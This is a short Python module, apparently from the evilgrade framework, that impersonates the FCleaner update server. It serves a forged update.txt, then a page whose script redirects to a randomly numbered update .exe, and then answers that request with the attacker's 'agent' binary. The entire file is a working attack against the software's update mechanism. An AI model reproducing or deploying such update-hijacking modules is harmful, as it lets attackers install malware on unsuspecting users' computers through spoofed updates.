from modules import ModuleBase


class Fcleaner(ModuleBase):
    name = 'Fcleaner'
    version = '1.0'
    appver = '< 1.2.9.409'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.fcleaner.com)' 
    requests = [
        {   'path': '/files/update.txt',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/fcleaner/update.txt',
        },
        {   'path': '/update',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.fcleaner.com/update<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }